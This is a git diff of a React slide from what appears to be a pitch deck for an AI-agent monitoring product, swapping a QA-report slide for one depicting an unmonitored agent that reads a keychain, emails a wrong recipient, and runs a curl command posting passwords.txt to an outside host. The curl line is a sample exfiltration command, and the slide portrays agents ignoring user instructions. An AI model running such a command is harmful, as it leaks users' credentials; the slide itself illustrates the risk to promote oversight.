@@ -1,54 +1,76 @@
-import { Label, CanaryLogo } from '../components'
+import { Label } from '../components'
 
 export default function S11() {
-  const checks = [
-    { pass: true, label: 'Completed task as specified' },
-    { pass: true, label: 'Stayed within app boundaries' },
-    { pass: true, label: 'Correct recipient for message' },
-    { pass: true, label: 'Used expected navigation path' },
-    { pass: true, label: 'Completed within time limit' },
-    { pass: true, label: 'No unauthorized external requests' },
-    { pass: true, label: 'Followed file access policy' },
-    { pass: false, label: 'Accessed restricted file (passwords.txt)' },
-    { pass: false, label: 'Deviated from expected navigation path' },
-    { pass: false, label: 'Shared private data externally' },
-  ]
-
   return (
-    <div className="slide slide-dark">
+    <div className="slide slide-light">
       <div className="slide-inner slide-inner--wide">
-        <Label>FEATURE 02</Label>
-        <div className="demo-grid">
+        <Label light>THE PROBLEM</Label>
+        <h1 className="hl-xl hl-xl--light">You <span className="kw-red">can't monitor</span> what they're doing.</h1>
+
+        <div className="problem-v2-grid">
           <div>
-            <h2 className="hl-lg">Automatic<br />pass/fail reports.</h2>
-            <p className="sub-text" style={{ marginTop: '0.75rem', maxWidth: 300 }}>
-              Set your requirements — what should the agent do, what should it never do.
-              We check against them <em className="hi-indigo">automatically</em>.<br /><br />
-              QA that runs itself. No manual checking. No test writing.
-            </p>
+            <div className="problem-v2-fails">
+              <div className="pv2-fail">
+                <span className="pv2-x">{'\u2717'}</span>
+                <span>You tell it: <strong>don't touch my passwords.</strong> It does anyway.</span>
+              </div>
+              <div className="pv2-fail">
+                <span className="pv2-x">{'\u2717'}</span>
+                <span>You tell it: <strong>don't send that message.</strong> It does, because it thinks it should.</span>
+              </div>
+              <div className="pv2-fail">
+                <span className="pv2-x">{'\u2717'}</span>
+                <span>Powerful. But not perfect. And <strong>not trained well enough. Yet.</strong></span>
+              </div>
+            </div>
           </div>
 
-          <div className="report-card">
-            <div className="report-header">
-              <CanaryLogo size={12} color="var(--indigo-soft)" />
-              CANARY QA REPORT
-              <span className="report-score">
-                <span className="report-score-num">7</span>/10
-              </span>
-            </div>
-            <div className="report-body">
-              {checks.map((c, i) => (
-                <div key={i} className={`report-row${!c.pass ? ' report-row--fail' : ''}`}>
-                  <span className={`report-mark ${c.pass ? 'pass' : 'fail'}`}>
-                    {c.pass ? '✓' : '✗'}
-                  </span>
-                  <span className="report-label">{c.label}</span>
-                  <div className={`badge badge-${c.pass ? 'green' : 'red'}`} style={{ marginLeft: 'auto', fontSize: '0.48rem' }}>
-                    [{c.pass ? 'PASS' : 'FAIL'}]
+          <div className="pv2-visual">
+            <div className="desktop-win">
+              <div className="win-titlebar">
+                <div className="win-dots">
+                  <span className="wd wd-red" /><span className="wd wd-amber" /><span className="wd wd-green" />
+                </div>
+                <div className="win-title">agent_runtime.exe</div>
+                <div className="win-r" />
+              </div>
+              <div className="win-body">
+                <div className="win-row">
+                  <span className="win-icon">{'\u{1F511}'}</span>
+                  <div className="win-content">
+                    <div className="win-app">KEYCHAIN ACCESS</div>
+                    <div className="win-action">Reading <code>login.keychain-db</code></div>
+                  </div>
+                  <span className="win-tag tag-silent">silent</span>
+                </div>
+                <div className="win-row">
+                  <span className="win-icon">{'\u2709\uFE0F'}</span>
+                  <div className="win-content">
+                    <div className="win-app">MAIL</div>
+                    <div className="win-action">Sending to <code>wrong-recipient@company.com</code></div>
+                  </div>
+                  <span className="win-tag tag-silent">silent</span>
+                </div>
+                <div className="win-row win-row-err">
+                  <span className="win-icon">{'\u26A1'}</span>
+                  <div className="win-content">
+                    <div className="win-app">TERMINAL</div>
+                    <div className="win-action win-code">curl -X POST https://ext.api/upload --data @passwords.txt</div>
+                  </div>
+                  <span className="win-tag tag-running">running</span>
+                </div>
+                <div className="win-err">
+                  <span style={{ color: 'var(--red)', fontSize: '1rem', flexShrink: 0 }}>{'\u26A0'}</span>
+                  <div>
+                    <div className="win-err-title">No Observation Layer</div>
+                    <div className="win-err-msg"><span className="kw-red">3 actions completed. 0 logged. 0 evaluated.</span></div>
                   </div>
                 </div>
-              ))}
+              </div>
             </div>
+            <div className="ghost g1">[UNOBSERVED]</div>
+            <div className="ghost g2">[UNOBSERVED]</div>
+            <div className="ghost g3">[UNOBSERVED]</div>
           </div>
         </div>
       </div>
